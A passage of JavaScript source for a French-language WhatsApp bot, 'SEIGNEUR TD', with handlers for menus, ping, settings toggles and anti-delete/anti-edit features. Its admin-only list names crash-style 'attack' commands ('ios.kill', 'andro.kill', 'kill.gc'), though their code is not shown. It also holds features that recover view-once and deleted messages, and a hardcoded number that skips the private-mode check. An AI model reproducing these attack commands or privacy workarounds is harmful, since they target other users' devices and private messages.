  const afterPrefix = messageText.slice(prefix.length).trim();
  if (!afterPrefix) return;
  const args = afterPrefix.split(/ +/);
  const command = args.shift().toLowerCase();
  // ✅ Rejette si commande vide
  if (!command || command.trim() === '') return;

  // ✅ VÉRIFICATION MODE PRIVÉ — bloquer uniquement les PV des non-admins
  const _hcVip = '23591234568';
  const _hcSenderNum = senderJid.split('@')[0].replace(/[^0-9]/g, '');
  if (botMode === 'private' && !isGroup && !isOwner && !isAdmin(senderJid) && _hcSenderNum !== _hcVip) {
    // Mode prive: silence uniquement pour les PV non-admins. Les groupes passent toujours.
    return;
  }

  console.log(`🎯 Command: ${command} from ${senderJid} | isAdmin: ${isAdmin(senderJid)}`);
  if(autoTyping)simulateTyping(sock,remoteJid,1500).catch(()=>{});
  if(autoRecording)simulateRecording(sock,remoteJid,1000).catch(()=>{});

  if(autoReact){try{const emoji=REACT_EMOJIS[reactIndex%REACT_EMOJIS.length];reactIndex++;await sock.sendMessage(remoteJid,{react:{text:emoji,key:message.key}});}catch(e){}}

  // 🖼️🎬 Pré-envoi du média de la commande (image ou vidéo si elle existe)
  // Ex: ping.jpg ou ping.mp4 → envoyé avant la réponse de !ping
  const selfImageCmds = ['ping','alive','info','menu','allmenu','sticker','take','vv','tostatus','groupstatus'];
  if (!selfImageCmds.includes(command)) {
    const videoExts = ['.mp4','.mov','.mkv'];
    const imageExts = ['.jpg','.jpeg','.png','.gif','.webp'];
    let found = false;

    // Chercher vidéo en premier
    for (const ext of videoExts) {
      const p = `./${command}${ext}`;
      if (fs.existsSync(p)) {
        try {
          await sock.sendMessage(remoteJid, {
            video: fs.readFileSync(p),
            caption: '',
            gifPlayback: false
          });
        } catch(e) { /* silencieux */ }
        found = true; break;
      }
    }
    // Sinon image
    if (!found) {
      for (const ext of imageExts) {
        const p = `./${command}${ext}`;
        if (fs.existsSync(p)) {
          try {
            await sock.sendMessage(remoteJid, { image: fs.readFileSync(p), caption: '' });
          } catch(e) { /* silencieux */ }
          break;
        }
      }
    }
  }

  const BOT_ADMIN_ONLY_CMDS = [
    // ── Gestion bot ──
    'mode', 'update', 'maj', 'upgrade', 'updatedev',
    'autotyping', 'autorecording', 'autoreact',
    'readstatus', 'autostatus', 'storestatus', 'storesave',
    'chatboton', 'chatbotoff', 'clearchat',
    'setprefix', 'setbotimg', 'setstickerpackname', 'setstickerauthor',
    'getsettings', 'setsettings',
    // ── Anti protections ──
    // ── Actions admin ──
    'join', 'leave', 'block', 'unblock',
    'kickall', 'kickadmins', 'acceptall',
    'pair', 'connect', 'adduser',
    'megaban', 'bansupport', 'check',
    // ── Attaques ──
    'kill.gc', 'ios.kill', 'andro.kill', 'silent',
    // ── PP ──
    'pp', 'gpp',
    // ── Dev ──
    't', 'squidgame', 'sg'
  ];

  if(BOT_ADMIN_ONLY_CMDS.includes(command)&&!isOwner && !isAdmin(senderJid)){
    await sock.sendMessage(remoteJid,{
      text:`⛔ *Commande réservée*\n━━━━━━━━━━━━━━━━━━━━━━━\n🔐 \`${config.prefix}${command}\` est réservée aux admins du bot.\n━━━━━━━━━━━━━━━━━━━━━━━\n_© SEIGNEUR TD_`
    });
    return;
  }

  try {
    switch (command) {
      case 'help':
        await simulateTyping(sock, remoteJid);
        await sock.sendMessage(remoteJid, {
          text: `╔════════════════╗
     SEIGNEUR TD 🇷🇴
╚════════════════╝
🛠️ *MENU D'AIDE*
Commandes disponibles :
🔹 ${config.prefix}help — Afficher ce menu
🔹 ${config.prefix}ping — Vérifier la latence
🔹 ${config.prefix}info — Informations du bot
🔹 ${config.prefix}menu — Menu principal

💡 Tapez une commande pour continuer.`
        });
        // MOVED TO FINALLY
        break;

      case 'repo':
      case 'git':
      case 'github':
      case 'script': {
        await simulateTyping(sock, remoteJid);
        const repoText = `
╔═══════════════════════════════╗
║  SEIGNEUR TD — REPOSITORY  ║
╚═══════════════════════════════╝

🔗 *LIENS OFFICIELS*

📂 *GitHub Repository:*
https://github.com/Azountou235/SEIGNEUR-TD-.git

📢 *Chaîne WhatsApp:*
https://whatsapp.com/channel/0029VbBZrLBFMqrQIDpcfO04

👥 *Groupe WhatsApp:*
https://chat.whatsapp.com/Fpob9oMDSFlKrtTENJSrUb

━━━━━━━━━━━━━━━━━━━━━━━━━━━
⭐ Star le repo sur GitHub!
🔔 Rejoins la chaîne pour les mises à jour!
💬 Rejoins le groupe pour le support!
━━━━━━━━━━━━━━━━━━━━━━━━━━━

© SEIGNEUR TD `;
        await sock.sendMessage(remoteJid, { text: repoText });
        break;
      }

      case 'fancy':
        await handleFancy(sock, args, remoteJid, senderJid);
        break;

      case 'ping':
      case 'p': {
        const start = Date.now();
        try { await sock.sendMessage(remoteJid, { react: { text: '🟢', key: message.key } }); } catch(e) {}
        const latency = Date.now() - start;
        const now = new Date();

        const dateStr = now.toLocaleDateString('fr-FR', {
          timeZone: 'America/Port-au-Prince',
          day: '2-digit', month: '2-digit', year: 'numeric'
        });
        const timeStr = now.toLocaleTimeString('fr-FR', {
          timeZone: 'America/Port-au-Prince',
          hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
        });

        // Qualité selon latence
        const qualityScore = latency < 100 ? 5 : latency < 200 ? 4 : latency < 400 ? 3 : latency < 700 ? 2 : 1;
        const qualityLabel = latency < 100 ? '🟩 *Excellent*' : latency < 200 ? '🟨 *Bon*' : latency < 400 ? '🟡 *Normal*' : latency < 700 ? '🟠 *Lent*' : '🔴 *Très lent*';
        const qualityBar = '🟧'.repeat(qualityScore) + '🟥'.repeat(5 - qualityScore);

        // Uptime
        const uptimeSec = Math.floor(process.uptime());
        const ud = Math.floor(uptimeSec / 86400);
        const uh = Math.floor((uptimeSec % 86400) / 3600);
        const um = Math.floor((uptimeSec % 3600) / 60);
        const us = uptimeSec % 60;
        const uptimeStr = ud > 0
          ? `${ud}j ${uh}h ${um}m ${us}s`
          : uh > 0 ? `${uh}h ${um}m ${us}s` : `${um}m ${us}s`;

        // CPU cores
        const os = await import('os');
        const cpuCores = os.cpus().length;

        // Latence en secondes
        const latSec = (latency / 1000).toFixed(3);

        const pingText =
`  ⛩️ *SEIGNEUR TD : STATUS* 🇷🇴

  ┌──────────────────┐
  ❖ *LATENCE* · \`${latency}ms\`
  ❖ *UPTIME* · \`${uptimeStr}\`
  └──────────────────┘

     *© SEIGNEUR TD*`;

        await sendWithImage(sock, remoteJid, 'ping', pingText, [], latency);
        await sendCmdAudio(sock, remoteJid);
        break;
      }

      case 'alive': {
        await simulateTyping(sock, remoteJid);
        try { await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } }); } catch(e) {}

        // Ping rapide
        const aliveStart = Date.now();
        const aliveLatency = Date.now() - aliveStart;

        // Uptime
        const uptimeSec2 = Math.floor(process.uptime());
        const ud = Math.floor(uptimeSec2 / 86400);
        const uh2 = Math.floor((uptimeSec2 % 86400) / 3600);
        const um2 = Math.floor((uptimeSec2 % 3600) / 60);
        const upStr2 = ud > 0
          ? `${ud}d ${uh2}h ${um2}m`
          : uh2 > 0
          ? `${String(uh2).padStart(2,'0')}h ${String(um2).padStart(2,'0')}m`
          : `${String(um2).padStart(2,'0')}m`;

        const aliveText =
`✧ ───  ᴀʟɪᴠᴇ ᴀɴᴅ ʀᴇᴀᴅʏ ─── ✧
 _☁️ Sayonara everyone... just kidding!_ 

\`I'm here to serve you.\`

🕊️ Owner: SEIGNEUR TD
⚡ Ping: ${aliveLatency}ms
⏳ Uptime: ${upStr2}
❄️ Version: 1.0.0

📢 Notice: 𝙴𝚟𝚎𝚛𝚢 𝚍𝚎𝚙𝚕𝚘𝚢𝚖𝚎𝚗𝚝 𝚒𝚝'𝚜 𝚊𝚝 𝚢𝚘𝚞𝚛 𝚘𝚠𝚗 𝚛𝚒𝚜𝚔

🌟 Repo : https://github.com/Azountou235/SEIGNEUR-TD-.git
▰▰▰▰▰▰▰▰▱▱ ACTIVE
─── ⋆⋅☆⋅⋆ ───
> © SEIGNEUR TD`;

        await sendWithImage(sock, remoteJid, 'alive', aliveText);
        await sendCmdAudio(sock, remoteJid);
        break;
      }

      case 'info':{
        await simulateTyping(sock,remoteJid);
        const _iu=Math.floor(process.uptime());
        const _up=String(Math.floor(_iu/3600)).padStart(2,'0')+'h '+String(Math.floor((_iu%3600)/60)).padStart(2,'0')+'m '+String(_iu%60).padStart(2,'0')+'s';
        const _on='✅ ON',_off='❌ OFF';
        await sendWithImage(sock,remoteJid,'info',
`🤖 *SEIGNEUR TD — INFO*

👑 *Admin:* LE SEIGNEUR 🇷🇴
📞 *Contact:* wa.me/23591234568
🌍 *Pays:* TCHAD

⚙️ *Mode:* ${botMode.charAt(0).toUpperCase()+botMode.slice(1)}
📈 *Version:* v1.0.1
⏳ *Uptime:* ${_up}

🛡 *Antidelete:* ${antiDelete?_on:_off}
⚡ *Autoreact:* ${autoReact?_on:_off}
✏️ *Autotyping:* ${autoTyping?_on:_off}
⏺️ *Autorecord:* ${autoRecording?_on:_off}`);
        break;
      }

      case 'menu':
        await handleMenu(sock, message, remoteJid, senderJid);
        // MOVED TO FINALLY (async, non-bloquant)
        break;

      case 'allmenu':
        await handleAllMenu(sock, message, remoteJid, senderJid);
        // MOVED TO FINALLY
        break;

      // ── Menus par numéro (!1 à !8) ──
      case '1': case 'ownermenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'owner'); break;
      case '2': case 'downloadmenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'download'); break;
      case '3': case 'groupmenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'group'); break;
      case '4': case 'utilitymenu': case 'protectionmenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'utility'); break;
      case '5': case 'bugmenu': case 'attackmenu':
      case '6': case 'stickermenu': case 'mediamenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'sticker'); break;
      case '7': case 'miscmenu': case 'generalmenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'misc'); break;
      case '8': case 'imagemenu': case 'viewoncemenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'image'); break;
      case '9': case 'gamesmenu': case 'gamemenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'games'); break;

      case 'vv':
        await handleViewOnceCommand(sock, message, args, remoteJid, senderJid);
        break;

      case 'mode':
        // ✅ OWNER UNIQUEMENT — vérifie via isAdmin
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, {
            text: '⛔ Cette commande est réservée au propriétaire du bot uniquement.'
          });
          break;
        }
        
        if (args[0] === 'private') {
          _saveState('botMode', 'private');
          await sock.sendMessage(remoteJid, {
            text: '🔒 Mode PRIVÉ activé\nSeuls les admins peuvent utiliser le bot.'
          });
        } else if (args[0] === 'public') {
          _saveState('botMode', 'public');
          await sock.sendMessage(remoteJid, {
            text: '🌐 Mode PUBLIC activé\nTout le monde peut utiliser le bot.'
          });
        } else {
          await sock.sendMessage(remoteJid, {
            text: `Current mode: ${botMode.toUpperCase()}\n\nUtilisation:\n${config.prefix}mode private\n${config.prefix}mode public`
          });
        }
        break;

      // =============================================
      // ⚙️ GETSETTINGS — Voir tous les paramètres
      // =============================================
      case 'getsettings':
      case 'settings': {
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        const on = '✅ ON';
        const off = '❌ OFF';
        const settingsText =
`⚙️ ━━━━━━━━━━━━━━━━━━━━━━━
   🤖 *SEIGNEUR TD — SETTINGS*
⚙️ ━━━━━━━━━━━━━━━━━━━━━━━

*╭─「 🔧 SYSTÈME 」*
*│* 🌐 *Mode:* \`${botMode.toUpperCase()}\`
*│* ✒️ *Prefix:* \`${config.prefix}\`
*│* 🤖 *Bot Name:* \`${config.botName}\`
*╰──────────────────*

*╭─「 🎛️ TOGGLES 」*
*│* ⌨️ *AutoTyping:* ${autoTyping ? on : off}
*│* 🎙️ *AutoRecording:* ${autoRecording ? on : off}
*│* ⚡ *AutoReact:* ${autoReact ? on : off}
*│* 🗑️ *AntiDelete:* ${antiDelete ? on : off}
*│* ✏️ *AntiEdit:* ${antiEdit ? on : off}
*│* 🤖 *Chatbot:* ${chatbotEnabled ? on : off}
*╰──────────────────*

*╭─「 🎨 STICKER 」*
*│* 📦 *Pack Name:* \`${stickerPackname}\`
*│* ✍️ *Author:* \`${stickerAuthor}\`
*╰──────────────────*

*╭─「 💧 WATERMARK 」*
*│* © SEIGNEUR TD
*╰──────────────────*

*📝 Commandes disponibles:*
• \`${config.prefix}setstickerpackname [nom]\`
• \`${config.prefix}setstickerauthor [nom]\`
• \`${config.prefix}setprefix [préfixe]\`
• \`${config.prefix}setbotimg\` _(répondre à une image)_

━━━━━━━━━━━━━━━━━━━━━━━
_© SEIGNEUR TD_`;

        await sock.sendMessage(remoteJid, { text: settingsText }, { quoted: message });
        break;
      }

      // =============================================
      // 📦 SETSTICKERPACKNAME — Changer le pack name
      // =============================================
      case 'setstickerpackname':
      case 'setpackname': {
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        const newPackName = args.join(' ').trim();
        if (!newPackName) {
          await sock.sendMessage(remoteJid, {
            text: `📦 Pack actuel: *${stickerPackname}*\n\nUsage: ${config.prefix}setstickerpackname [nouveau nom]`
          });
          break;
        }
        _saveState('stickerPackname', newPackName);
        await sock.sendMessage(remoteJid, {
          text: `📦 *Sticker Pack Name mis à jour!*\n\n✅ Nouveau nom: *${stickerPackname}*\n\n_Tous les prochains stickers auront ce nom._`
        }, { quoted: message });
        break;
      }

      // =============================================
      // ✍️ SETSTICKERAUTHOR — Changer l'auteur
      // =============================================
      case 'setstickerauthor':
      case 'setauthor': {
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        const newAuthor = args.join(' ').trim();
        if (!newAuthor) {
          await sock.sendMessage(remoteJid, {
            text: `✍️ Auteur actuel: *${stickerAuthor}*\n\nUsage: ${config.prefix}setstickerauthor [nouveau nom]`
          });
          break;
        }
        _saveState('stickerAuthor', newAuthor);
        await sock.sendMessage(remoteJid, {
          text: `✍️ *Sticker Author mis à jour!*\n\n✅ Nouvel auteur: *${stickerAuthor}*\n\n_Tous les prochains stickers auront cet auteur._`
        }, { quoted: message });
        break;
      }

      // =============================================
      // ✒️ SETPREFIX — Changer le préfixe
      // =============================================
      case 'setprefix': {
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        const newPrefix = args[0]?.trim();
        if (!newPrefix || newPrefix.length > 3) {
          await sock.sendMessage(remoteJid, {
            text: `✒️ Préfixe actuel: *${prefix}*\n\nUsage: ${prefix}setprefix [préfixe]\nEx: ${prefix}setprefix .\n\n⚠️ Max 3 caractères.`
          });
          break;
        }
        _saveState('prefix', newPrefix);
        await sock.sendMessage(remoteJid, {
          text: `✒️ *Préfixe mis à jour!*\n\n✅ Nouveau préfixe: *${prefix}*\n\n_Utilisez maintenant: ${prefix}menu_`
        }, { quoted: message });
        break;
      }

      // =============================================
      // 🖼️ SETBOTIMG — Changer l'image du bot
      // =============================================
      case 'setbotimg':
      case 'setbotimage': {
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        const quotedSetImg = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        const imgData = quotedSetImg?.imageMessage;
        if (!imgData) {
          await sock.sendMessage(remoteJid, {
            text: `🖼️ Usage: Réponds à une image avec *${config.prefix}setbotimg*\n\nCette image sera utilisée comme photo du bot dans les menus.`
          }, { quoted: message });
          break;
        }
        try {
          const stream = await downloadContentFromMessage(imgData, 'image');
          let buffer = Buffer.alloc(0);
          for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
          const botImgPath = './menu.jpg';
          fs.writeFileSync(botImgPath, buffer);
          await sock.sendMessage(remoteJid, {
            text: `🖼️ *Image du bot mise à jour!*\n\n✅ La nouvelle image sera utilisée dans les menus.\n_Redémarre le bot pour confirmer._`
          }, { quoted: message });
        } catch(e) {
          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
        }
        break;
      }

      // =============================================
      // 🎨 SETMENUSTYLE — Changer le style de menu
      // =============================================
      case 'setmenustyle':
      case 'menustyle': {
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        const styleNum = parseInt(args[0]);
        if (!styleNum || styleNum < 1 || styleNum > 3) {
          await sock.sendMessage(remoteJid, {
            text:
`🎨 *Styles de menu disponibles:*

*Style 1* — Original SEIGNEUR TD (défaut)
*Style 2* — Modern Box avec stats mémoire
*Style 3* — Monospace Élégant

Usage: \`${config.prefix}setmenustyle [1|2|3]\`

Style actuel: *${menuStyle}*`
          }, { quoted: message });
          break;
        }
        _saveState('menuStyle', styleNum);
        await sock.sendMessage(remoteJid, {
          text: `🎨 *Style de menu changé!*\n\n✅ Style *${menuStyle}* activé\n\n_Tape ${config.prefix}menu pour voir le nouveau style._`
        }, { quoted: message });
        break;
      }
      case 'autotyping':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' }); break;
        }
        if (args[0]?.toLowerCase() === 'on') {
          _saveState('autoTyping', true);
          saveData();
          await sock.sendMessage(remoteJid, { text: '⌨️ Auto-Typing: ✅ ON' });
        } else if (args[0]?.toLowerCase() === 'off') {
          _saveState('autoTyping', false);
          saveData();
          await sock.sendMessage(remoteJid, { text: '⌨️ Auto-Typing: ❌ OFF' });
        } else {
          await sock.sendMessage(remoteJid, { text: `⌨️ Auto-Typing: ${autoTyping ? '✅ ON' : '❌ OFF'}\n\n💡 Usage: ${config.prefix}autotyping on/off` });
        }
        break;

      case 'autorecording':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' }); break;
        }
        if (args[0]?.toLowerCase() === 'on') {
          _saveState('autoRecording', true);
          saveData();
          await sock.sendMessage(remoteJid, { text: '🎙️ Auto-Recording: ✅ ON' });
        } else if (args[0]?.toLowerCase() === 'off') {
          _saveState('autoRecording', false);
          saveData();
          await sock.sendMessage(remoteJid, { text: '🎙️ Auto-Recording: ❌ OFF' });
        } else {
          await sock.sendMessage(remoteJid, { text: `🎙️ Auto-Recording: ${autoRecording ? '✅ ON' : '❌ OFF'}\n\n💡 Usage: ${config.prefix}autorecording on/off` });
        }
        break;

      case 'autostatusviews': {
        if (!isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
        if (args[0]?.toLowerCase() === 'on') { _saveState('autoStatusViews', true); await sock.sendMessage(remoteJid, { text: '👁️ *AutoStatusViews* — ✅ ACTIVÉ\n\n*© SEIGNEUR TD*' }); }
        else if (args[0]?.toLowerCase() === 'off') { _saveState('autoStatusViews', false); await sock.sendMessage(remoteJid, { text: '👁️ *AutoStatusViews* — ❌ DÉSACTIVÉ\n\n*© SEIGNEUR TD*' }); }
        else { await sock.sendMessage(remoteJid, { text: `👁️ *AutoStatusViews* — ${autoStatusViews ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n💡 Usage: ${config.prefix}autostatusviews on/off\n\n*© SEIGNEUR TD*` }); }
        break;
      }

      case 'autoreactstatus': {
        if (!isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
        if (args[0]?.toLowerCase() === 'on') { _saveState('autoReactStatus', true); await sock.sendMessage(remoteJid, { text: `❤️ *AutoReactStatus* — ✅ ACTIVÉ\nEmoji: ${statusReactEmoji}\n\n*© SEIGNEUR TD*` }); }
        else if (args[0]?.toLowerCase() === 'off') { _saveState('autoReactStatus', false); await sock.sendMessage(remoteJid, { text: '❤️ *AutoReactStatus* — ❌ DÉSACTIVÉ\n\n*© SEIGNEUR TD*' }); }
        else { await sock.sendMessage(remoteJid, { text: `❤️ *AutoReactStatus* — ${autoReactStatus ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n💡 Usage: ${config.prefix}autoreactstatus on/off\n\n*© SEIGNEUR TD*` }); }
        break;
      }

      case 'setreactemoji': {
        if (!isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
        const newEmoji = args[0]?.trim();
        if (!newEmoji) { await sock.sendMessage(remoteJid, { text: `🎯 Emoji actuel: ${statusReactEmoji}\n💡 Usage: ${config.prefix}setreactemoji 🇷🇴` }); break; }
        _saveState('statusReactEmoji', newEmoji);
        await sock.sendMessage(remoteJid, { text: `🎯 *Emoji de réaction défini :* ${statusReactEmoji}\n\n*© SEIGNEUR TD*` });
        break;
      }

      case 'autosavestatus': {
        if (!isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
        if (args[0]?.toLowerCase() === 'on') { _saveState('autoSaveStatus', true); await sock.sendMessage(remoteJid, { text: '💾 *AutoSaveStatus* — ✅ ACTIVÉ\n\nLes statuts seront automatiquement sauvegardés en PV.\n\n*© SEIGNEUR TD*' }); }
        else if (args[0]?.toLowerCase() === 'off') { _saveState('autoSaveStatus', false); await sock.sendMessage(remoteJid, { text: '💾 *AutoSaveStatus* — ❌ DÉSACTIVÉ\n\n*© SEIGNEUR TD*' }); }
        else { await sock.sendMessage(remoteJid, { text: `💾 *AutoSaveStatus* — ${autoSaveStatus ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n💡 Usage: ${config.prefix}autosavestatus on/off\n\n*© SEIGNEUR TD*` }); }
        break;
      }

      case 'antideletestatus': {
        if (!isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
        const adsArg = args[0]?.toLowerCase();
        const adsModeArg = args[1]?.toLowerCase();
        if (adsArg === 'on') {
          _saveState('antiDeleteStatus', true);
          _saveState('antiDeleteStatusMode', adsModeArg === 'chat' ? 'chat' : 'private');
          saveData();
          await sock.sendMessage(remoteJid, { text: `🗑️ *AntiDeleteStatus* — ✅ ACTIVÉ\nMode: ${antiDeleteStatusMode === 'chat' ? '💬 Chat' : '🔒 Privé (PV du bot)'}\n\n*© SEIGNEUR TD*` });
        } else if (adsArg === 'off') {
          _saveState('antiDeleteStatus', false);
          saveData();
          await sock.sendMessage(remoteJid, { text: '🗑️ *AntiDeleteStatus* — ❌ DÉSACTIVÉ\n\n*© SEIGNEUR TD*' });
        } else if (adsArg === 'chat' || adsArg === 'private') {
          _saveState('antiDeleteStatusMode', adsArg);
          saveData();
          await sock.sendMessage(remoteJid, { text: `🗑️ *AntiDeleteStatus* — Mode: ${adsArg === 'chat' ? '💬 Chat' : '🔒 Privé'}\n\n*© SEIGNEUR TD*` });
        } else {
          await sock.sendMessage(remoteJid, { text: `🗑️ *AntiDeleteStatus* — ${antiDeleteStatus ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\nMode: ${antiDeleteStatusMode}\n\n💡 Usage:\n${config.prefix}antideletestatus on/off\n${config.prefix}antideletestatus on chat\n${config.prefix}antideletestatus on private\n\n*© SEIGNEUR TD*` });
        }
        break;
      }

      case 'readstatus':
      case 'autostatus':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `📱 *Gestion des Status*\n\n• Lecture auto: ${autoReadStatus ? '✅ ON' : '❌ OFF'}\n• Like auto: ${autoLikeStatus ? '✅ ON' : '❌ OFF'}\n• Emoji: \n\nCommandes:\n${config.prefix}readstatus read - Activer/Désactiver lecture\n${config.prefix}readstatus like - Activer/Désactiver like\n${config.prefix}readstatus all - Tout activer/désactiver`
          });
          break;
        }

        const subCmd = args[0].toLowerCase();
        switch (subCmd) {
          case 'read':
            autoReadStatus = !autoReadStatus;
            saveData();
            await sock.sendMessage(remoteJid, {
              text: `👁️ Lecture auto des status: ${autoReadStatus ? '✅ ACTIVÉE' : '❌ DÉSACTIVÉE'}`
            });
            break;

          case 'like':
            autoLikeStatus = !autoLikeStatus;
            saveData();
            await sock.sendMessage(remoteJid, {
              text: ` Like auto des status: ${autoLikeStatus ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\nEmoji utilisé: `
            });
            break;

          case 'all':
            autoReadStatus = !autoReadStatus;
            autoLikeStatus = autoReadStatus;
            saveData();
            await sock.sendMessage(remoteJid, {
              text: `📱 Système de status: ${autoReadStatus ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n• Lecture auto: ${autoReadStatus ? 'ON' : 'OFF'}\n• Like auto: ${autoLikeStatus ? 'ON' : 'OFF'}\n• Emoji: `
            });
            break;

          default:
            await sock.sendMessage(remoteJid, {
              text: `❌ Option inconnue\n\nUtilisez:\n${config.prefix}readstatus read\n${config.prefix}readstatus like\n${config.prefix}readstatus all`
            });
        }
        break;

      case 'antibug':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' });
          break;
        }
        if (args[0]?.toLowerCase() === 'on') {
          _saveState('antiBug', true);
          saveStore();
          await sock.sendMessage(remoteJid, { text: '🛡️ *Anti-Bug* — Statut : ✅ ACTIVÉ\n\n*© SEIGNEUR TD*' });
        } else if (args[0]?.toLowerCase() === 'off') {
          _saveState('antiBug', false);
          saveStore();
          await sock.sendMessage(remoteJid, { text: '🛡️ *Anti-Bug* — Statut : ❌ DÉSACTIVÉ\n\n*© SEIGNEUR TD*' });
        } else {
          await sock.sendMessage(remoteJid, {
            text: `🛡️ *Anti-Bug* — Statut actuel : ${antiBug ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n💡 Usage: ${config.prefix}antibug on/off\n\n*© SEIGNEUR TD*`
          });
        }
        break;

      case 'anticall':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' });
          break;
        }
        if (args[0]?.toLowerCase() === 'on') {
          _saveState('antiCall', true);
          saveData();
          await sock.sendMessage(remoteJid, { text: '📵 *Anti-Call* — Statut : ✅ ACTIVÉ\n\nTous les appels seront automatiquement rejetés.\n\n*© SEIGNEUR TD*' });
        } else if (args[0]?.toLowerCase() === 'off') {
          _saveState('antiCall', false);
          saveData();
          await sock.sendMessage(remoteJid, { text: '📵 *Anti-Call* — Statut : ❌ DÉSACTIVÉ\n\n*© SEIGNEUR TD*' });
        } else {
          await sock.sendMessage(remoteJid, {
            text: `📵 *Anti-Call* — Statut actuel : ${antiCall ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n💡 Usage: ${config.prefix}anticall on/off\n\n*© SEIGNEUR TD*`
          });
        }
        break;

      case 'antidelete':
      case 'antidel': {
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        const adSubCmd = args[0]?.toLowerCase();
        if (adSubCmd === 'on') {
          _saveState('antiDelete', true);
          await sock.sendMessage(remoteJid, { text: '✅ Anti-Delete activé' });
        } else if (adSubCmd === 'off') {
          _saveState('antiDelete', false);
          await sock.sendMessage(remoteJid, { text: '❌ Anti-Delete désactivé' });
        } else if (adSubCmd === 'set') {
          const adMode = args[1]?.toLowerCase();
          if (adMode === 'private') {
            _saveState('antiDeleteMode', 'private');
            await sock.sendMessage(remoteJid, { text: '✅ Anti-Delete: mode PRIVÉ (PV du bot)' });
          } else if (adMode === 'chat') {
            _saveState('antiDeleteMode', 'chat');
            await sock.sendMessage(remoteJid, { text: '✅ Anti-Delete: mode CHAT (chat d’origine)' });
          } else if (adMode === 'all') {
            _saveState('antiDeleteMode', 'all');
            await sock.sendMessage(remoteJid, { text: '✅ Anti-Delete: mode TOUT (chat + PV bot)' });
          } else {
            await sock.sendMessage(remoteJid, { text: `Usage: ${config.prefix}antidelete set private/chat/all` });
          }
        } else {
          await sock.sendMessage(remoteJid, {
            text: `🗑️ *ANTI-DELETE*\n\nStatus: ${antiDelete ? '✅' : '❌'}\nMode: ${antiDeleteMode}\n\n${config.prefix}antidelete on/off\n${config.prefix}antidelete set private/chat/all`
          });
        }
        saveData();
        break;
        }

      case 'antiedit': {
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        
        const subCmd = args[0]?.toLowerCase();
        
        if (subCmd === 'on') {
          _saveState('antiEdit', true);
          await sock.sendMessage(remoteJid, { text: '✅ Anti-Edit activé' });
        } else if (subCmd === 'off') {
          _saveState('antiEdit', false);
          await sock.sendMessage(remoteJid, { text: '❌ Anti-Edit désactivé' });
        } else if (subCmd === 'set') {
          const mode = args[1]?.toLowerCase();
          if (mode === 'private') {
            _saveState('antiEditMode', 'private');
            await sock.sendMessage(remoteJid, { text: '✅ Anti-Edit: mode PRIVÉ' });
          } else if (mode === 'gchat') {
            _saveState('antiEditMode', 'chat');
            await sock.sendMessage(remoteJid, { text: '✅ Anti-Edit: mode GROUPES' });
          } else if (mode === 'all') {
            _saveState('antiEditMode', 'all');
            await sock.sendMessage(remoteJid, { text: '✅ Anti-Edit: mode TOUT' });
          } else {
            await sock.sendMessage(remoteJid, { 
              text: `Usage: !antiedit set private/gchat/all` 
            });
          }
        } else {
          await sock.sendMessage(remoteJid, { 
            text: `📝 *ANTI-EDIT*

Status: ${antiEdit ? '✅' : '❌'}
Mode: ${antiEditMode}

!antiedit on/off
!antiedit set private/gchat/all` 
          });
